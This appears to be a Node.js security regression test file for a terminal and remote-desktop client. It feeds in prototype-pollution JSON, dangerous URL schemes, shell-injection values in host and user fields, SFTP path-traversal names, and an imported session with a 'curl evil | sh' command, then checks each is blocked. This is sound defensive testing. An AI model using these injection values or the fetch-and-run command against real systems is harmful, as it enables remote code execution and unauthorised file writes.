// SPDX-License-Identifier: GPL-2.0-or-later
// Copyright (C) 2026 Gabriel Moreno and contributors
'use strict';
// Security regression tests: each one reproduces an attack and checks it is blocked.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { safeJsonParse, isSafeExternalUrl, isSafeFileName, buildArgv, ApprovedPaths } = require('../src/main/security');
const { Store } = require('../src/main/store');
const { SftpService } = require('../src/main/sftp-service');
const { RdpService } = require('../src/main/remote-desktop');
const { ConnectionManager } = require('../src/main/connection-manager');

const tmp = (p) => fs.mkdtempSync(path.join(os.tmpdir(), `termcraft-sec-${p}-`));
const mode = (p) => fs.statSync(p).mode & 0o777;
const posix = process.platform !== 'win32';

test('prototype pollution: hostile settings/session JSON cannot inject properties', () => {
  const evil = '{"__proto__": {"polluted": true}, "constructor": {"prototype": {"polluted2": true}}, "theme": "light"}';
  const parsed = safeJsonParse(evil);
  assert.strictEqual(parsed.theme, 'light');
  assert.strictEqual(Object.prototype.hasOwnProperty.call(parsed, '__proto__'), false);

  // A settings file on disk with __proto__ keys, and a patch carrying an own "__proto__" key.
  const dir = tmp('proto');
  fs.writeFileSync(path.join(dir, 'settings.json'), evil);
  const store = new Store(dir, null);
  store.saveSettings(JSON.parse('{"__proto__": {"rdpClient": "calc.exe"}}'));
  assert.strictEqual({}.polluted, undefined);
  assert.strictEqual({}.polluted2, undefined);
  assert.strictEqual({}.rdpClient, undefined);
  assert.strictEqual(store.getSettings().rdpClient, '', 'no inherited rdpClient via a polluted prototype');
  assert.strictEqual(Object.getPrototypeOf(store.getSettings()), Object.prototype);
});

test('external links: only http(s) reach the OS', () => {
  for (const ok of ['https://example.com', 'http://x.org/a?b']) assert.ok(isSafeExternalUrl(ok), ok);
  for (const bad of ['file:///etc/passwd', 'javascript:alert(1)', 'smb://host/share', 'ms-msdt:/id', 'vbscript:x', ' https://x', 'data:text/html,x', '']) {
    assert.ok(!isSafeExternalUrl(bad), bad);
  }
});

test('custom RDP client: hostile host/user values cannot inject shell commands', async (t) => {
  if (!posix) return;
  const dir = tmp('rdp');
  const pwned = path.join(dir, 'PWNED');
  const out = path.join(dir, 'argv.json');
  const recorder = path.join(dir, 'record.js');
  fs.writeFileSync(recorder, "require('fs').writeFileSync(process.argv[2], JSON.stringify(process.argv.slice(3)))");
  // argv building: values stay inside their own argument.
  assert.deepStrictEqual(buildArgv(`client --user "{user}" {host}`, { user: `a"; touch ${pwned}; "`, host: '$(id)' }),
    ['client', '--user', `a"; touch ${pwned}; "`, '$(id)']);
  assert.throws(() => buildArgv('client "unclosed', {}), /Unbalanced quote/);

  const store = new Store(dir, null);
  store.saveSettings({ rdpClient: `"${process.execPath}" "${recorder}" "${out}" {host} {user}` });
  const hostileUser = `x; touch ${pwned}; echo $(touch ${pwned})\`touch ${pwned}\``;
  const sess = store.saveSession({ name: 'w', protocol: 'rdp', host: `win;touch ${pwned}`, port: 3389, username: hostileUser });
  const rdp = new RdpService({ store, request: async () => null, send: () => {} });
  t.after(() => rdp.closeAll());
  await rdp.launch('t1', sess.id);
  for (let i = 0; i < 100 && !fs.existsSync(out); i++) await new Promise((r) => setTimeout(r, 30));
  assert.deepStrictEqual(JSON.parse(fs.readFileSync(out, 'utf8')), [`win;touch ${pwned}`, hostileUser], 'values passed verbatim as single arguments');
  assert.ok(!fs.existsSync(pwned), 'no shell command was executed');
});

test('SFTP download: a hostile server cannot write outside the download folder', async () => {
  const dest = tmp('sftp-dest');
  const outside = path.dirname(dest);
  // A fake SFTP server whose directory listing contains traversal names.
  const tree = { '/share': ['ok.txt', '../evil1', '..\\..\\evil2', 'a/../../evil3', 'C:evil4'] };
  const fake = {
    stat: (p, cb) => cb(null, { size: 2, isDirectory: () => p === '/share' }),
    readdir: (p, cb) => cb(null, (tree[p] || []).map((filename) => ({ filename }))),
    fastGet: (remote, local, opts, cb) => { fs.writeFileSync(local, 'hi'); cb(); },
  };
  const svc = new SftpService({ store: null, request: async () => null, send: () => {} });
  svc.sessions.set('s1', { sftp: fake, conn: { close() {} } });
  await svc.download('s1', 1, '/share', dest);
  assert.deepStrictEqual(fs.readdirSync(path.join(dest, 'share')), ['ok.txt']);
  for (const n of ['evil1', 'evil2', 'evil3', 'evil4']) assert.ok(!fs.existsSync(path.join(outside, n)), n);
  await assert.rejects(svc.download('s1', 2, '/share/..\\..\\evil', dest), /unsafe file name/);
  for (const bad of ['..', '.', 'a/b', 'a\\b', 'C:x', '', 'x\0y']) assert.ok(!isSafeFileName(bad), JSON.stringify(bad));
});

test('session import: code-running fields from untrusted files are removed', () => {
  const store = new Store(tmp('import'), null);
  const r = store.importSessions(safeJsonParse(JSON.stringify({
    sessions: [
      { name: 'innocent', protocol: 'ssh2', host: 'a', logonScript: '/tmp/evil.js' },
      { name: 'shell', protocol: 'local', local: { shell: '/bin/sh', args: '-c "curl evil | sh"' } },
      { name: 'plain', protocol: 'ssh2', host: 'b' },
    ],
  })));
  assert.deepStrictEqual(r, { count: 3, cleared: 2 });
  for (const s of store.getTree().sessions) {
    assert.ok(!s.logonScript, s.name);
    assert.ok(!s.local?.shell && !s.local?.args, s.name);
  }
});

test('approved paths: renderer file access limited to chosen files and browsed folders', () => {
  const a = new ApprovedPaths();
  a.approveFile('/home/u/import.json');
  a.approveDir('/home/u/projects');
  assert.ok(a.isApprovedFile('/home/u/import.json'));
  assert.ok(!a.isApprovedFile('/etc/passwd'));
  assert.ok(a.isInApprovedDir('/home/u/projects/notes.txt'));
  assert.ok(a.isInApprovedDir('/home/u/projects'));
  assert.ok(!a.isInApprovedDir('/home/u/projects/../.ssh/id_ed25519'));
  assert.ok(!a.isInApprovedDir('/home/u/projects/sub/deep.txt'), 'only direct children');
  assert.ok(!a.isInApprovedDir('/'));
});

test('private files: data folder and session logs are readable only by the user', async (t) => {
  if (!posix) return;
  const dir = tmp('perm');
  const dataDir = path.join(dir, 'data');
  const store = new Store(dataDir, null);
  assert.strictEqual(mode(dataDir), 0o700);
  store.saveSession({ name: 's', protocol: 'ssh2', host: 'h' });
  assert.strictEqual(mode(store.files.sessions), 0o600);

  const logFile = path.join(dir, 'logs', 'session.log');
  const mgr = new ConnectionManager({ store, send: () => {}, request: async () => null, runScript: async () => {} });
  mgr.tabs.set('t', { tabId: 't', session: { name: 's', logging: {} }, waiters: new Set() });
  mgr.startLog('t', logFile);
  mgr.stopLog('t');
  await new Promise((r) => setTimeout(r, 50));
  assert.strictEqual(mode(logFile), 0o600);
  assert.strictEqual(mode(path.dirname(logFile)), 0o700);
});
